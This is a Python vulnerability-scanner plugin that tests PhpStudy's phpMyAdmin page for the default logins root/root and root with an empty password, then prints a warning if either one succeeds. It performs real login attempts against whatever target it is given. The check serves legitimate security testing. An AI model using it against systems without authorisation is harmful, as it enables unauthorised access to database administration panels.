# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 19:25
@File:  PhpStudyDB.py
@Desc:
'''

from lib import *
import logging
from lib.Urldeal import umethod
import requests

def PhpStudyDB(Url): #必须与脚本名称相同
    scheme, url, port = umethod(Url)
    try:
        payload_url = scheme + "://" + url + ':' + str(port) + "/phpmyadmin/index.php"
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            "Content-Type": "application/x-www-form-urlencoded",
            'User-Agent':"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
        }
        post_data = {
            "pma_username": "root",
            "pma_password": "root",
            "server": "1",
            "target": "index.php"
        }
        post_data1 = {
            "pma_username": "root",
            "pma_password": "",
            "server": "1",
            "target": "index.php"
        }
        s = requests.session()
        resp = s.post(payload_url, data=post_data, headers=headers, timeout=5, verify=False)
        resp2 = s.get(payload_url, headers=headers, timeout=5, verify=False)
        con = resp.text
        con2 = resp2.text
        if con2.lower().find('navigation.php') != -1 and con.lower().find('frame_navigation') != -1:
            print(Vcolors.RED +"[!] 存在PhpStudy默认数据库界面口令漏洞，默认口令root/root\r" + Vcolors.ENDC)
        else:
            resp = s.post(payload_url, data=post_data1, headers=headers, timeout=5, verify=False)
            resp2 = s.get(payload_url, headers=headers, timeout=5, verify=False)
            con = resp.text
            con2 = resp2.text
            if con2.lower().find('navigation.php') != -1 and con.lower().find('frame_navigation') != -1:
                print(Vcolors.RED + "[!] 存在PhpStudy默认数据库界面口令漏洞，默认口令root/空\r" + Vcolors.ENDC)
    except:
        logging.error("PhpStudyDB脚本出现异常")